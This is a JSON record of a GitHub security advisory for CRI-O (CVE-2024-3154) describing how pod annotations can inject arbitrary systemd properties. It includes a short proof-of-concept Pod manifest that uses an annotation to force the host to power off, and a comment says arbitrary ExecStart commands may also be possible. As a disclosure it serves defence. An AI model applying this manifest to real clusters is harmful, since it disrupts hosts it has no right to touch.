{
	"cvss": {},
	"ghsa_id": "GHSA-2cgq-h8xw-2v5j",
	"summary": "arbitrary systemd property injection",
	"description": "### Impact\r\nOn CRI-O, it looks like an arbitrary systemd property can be injected via a Pod annotation:\r\n```\r\n---\r\napiVersion: v1\r\nkind: Pod\r\nmetadata:\r\n  name: poc-arbitrary-systemd-property-injection\r\n  annotations:\r\n    # I believe that ExecStart with an arbitrary command works here too,\r\n    # but I haven't figured out how to marshalize the ExecStart struct to gvariant string.\r\n    org.systemd.property.SuccessAction: \"'poweroff-force'\"\r\nspec:\r\n  containers:\r\n    - name: hello\r\n      image: [quay.io/podman/hello](http://quay.io/podman/hello)\r\n```\r\n\r\nThis means that any user who can create a pod with an arbitrary annotation may perform an arbitrary action on the host system.\r\n\r\nTested with CRI-O v1.24 on minikube.\r\nI didn't test the latest v1.29 because it is incompatible with minikube: https://github.com/kubernetes/minikube/pull/18367\r\n\r\nThanks to CÃ©dric Clerget (GitHub ID @cclerget) for finding out that CRI-O just passes pod annotations to OCI annotations:\r\nhttps://github.com/opencontainers/runc/pull/3923#discussion_r1532292536\r\n\r\nCRI-O has to filter out annotations that have the prefix \"org.systemd.property.\"\r\n\r\nSee also:\r\n- https://github.com/opencontainers/runtime-spec/blob/main/features.md#unsafe-annotations-in-configjson\r\n- https://github.com/opencontainers/runc/pull/4217\r\n\r\n\r\n### Workarounds\r\nUnfortunately, the only workarounds would involve an external mutating webhook to disallow these annotations\r\n\r\n### References\r\n\r\n",
	"severity": "high",
	"identifiers": [
		{
			"value": "GHSA-2cgq-h8xw-2v5j",
			"type": "GHSA"
		},
		{
			"value": "CVE-2024-3154",
			"type": "CVE"
		}
	],
	"published_at": "2024-04-29T16:19:03Z",
	"updated_at": "2024-04-30T18:07:57Z",
	"vulnerabilities": [
		{
			"package": {
				"ecosystem": "cri-o",
				"name": "CRI-O"
			},
			"vulnerable_version_range": "1.29.3, 1.28.5, 1.27.5",
			"patched_versions": "1.30.0, 1.29.4, 1.28.6, 1.27.6"
		}
	],
	"cve_id": "CVE-2024-3154",
	"url": "https://api.github.com/repos/cri-o/cri-o/security-advisories/GHSA-2cgq-h8xw-2v5j",
	"html_url": "https://github.com/cri-o/cri-o/security/advisories/GHSA-2cgq-h8xw-2v5j",
	"publisher": {
		"login": "haircommander",
		"id": 9082919,
		"node_id": "MDQ6VXNlcjkwODI5MTk=",
		"avatar_url": "https://avatars.githubusercontent.com/u/9082919?v=4",
		"html_url": "https://github.com/haircommander",
		"gravatar_id": "",
		"type": "User",
		"site_admin": false,
		"url": "https://api.github.com/users/haircommander",
		"events_url": "https://api.github.com/users/haircommander/events{/privacy}",
		"following_url": "https://api.github.com/users/haircommander/following{/other_user}",
		"followers_url": "https://api.github.com/users/haircommander/followers",
		"gists_url": "https://api.github.com/users/haircommander/gists{/gist_id}",
		"organizations_url": "https://api.github.com/users/haircommander/orgs",
		"received_events_url": "https://api.github.com/users/haircommander/received_events",
		"repos_url": "https://api.github.com/users/haircommander/repos",
		"starred_url": "https://api.github.com/users/haircommander/starred{/owner}{/repo}",
		"subscriptions_url": "https://api.github.com/users/haircommander/subscriptions"
	},
	"state": "published",
	"credits": [
		{
			"login": "AkihiroSuda",
			"type": "reporter"
		},
		{
			"login": "cclerget",
			"type": "finder"
		}
	],
	"credits_detailed": [
		{
			"user": {
				"login": "AkihiroSuda",
				"id": 9248427,
				"node_id": "MDQ6VXNlcjkyNDg0Mjc=",
				"avatar_url": "https://avatars.githubusercontent.com/u/9248427?v=4",
				"html_url": "https://github.com/AkihiroSuda",
				"gravatar_id": "",
				"type": "User",
				"site_admin": false,
				"url": "https://api.github.com/users/AkihiroSuda",
				"events_url": "https://api.github.com/users/AkihiroSuda/events{/privacy}",
				"following_url": "https://api.github.com/users/AkihiroSuda/following{/other_user}",
				"followers_url": "https://api.github.com/users/AkihiroSuda/followers",
				"gists_url": "https://api.github.com/users/AkihiroSuda/gists{/gist_id}",
				"organizations_url": "https://api.github.com/users/AkihiroSuda/orgs",
				"received_events_url": "https://api.github.com/users/AkihiroSuda/received_events",
				"repos_url": "https://api.github.com/users/AkihiroSuda/repos",
				"starred_url": "https://api.github.com/users/AkihiroSuda/starred{/owner}{/repo}",
				"subscriptions_url": "https://api.github.com/users/AkihiroSuda/subscriptions"
			},
			"type": "reporter",
			"state": "accepted"
		},
		{
			"user": {
				"login": "cclerget",
				"id": 3274134,
				"node_id": "MDQ6VXNlcjMyNzQxMzQ=",
				"avatar_url": "https://avatars.githubusercontent.com/u/3274134?v=4",
				"html_url": "https://github.com/cclerget",
				"gravatar_id": "",
				"type": "User",
				"site_admin": false,
				"url": "https://api.github.com/users/cclerget",
				"events_url": "https://api.github.com/users/cclerget/events{/privacy}",
				"following_url": "https://api.github.com/users/cclerget/following{/other_user}",
				"followers_url": "https://api.github.com/users/cclerget/followers",
				"gists_url": "https://api.github.com/users/cclerget/gists{/gist_id}",
				"organizations_url": "https://api.github.com/users/cclerget/orgs",
				"received_events_url": "https://api.github.com/users/cclerget/received_events",
				"repos_url": "https://api.github.com/users/cclerget/repos",
				"starred_url": "https://api.github.com/users/cclerget/starred{/owner}{/repo}",
				"subscriptions_url": "https://api.github.com/users/cclerget/subscriptions"
			},
			"type": "finder",
			"state": "accepted"
		}
	]
}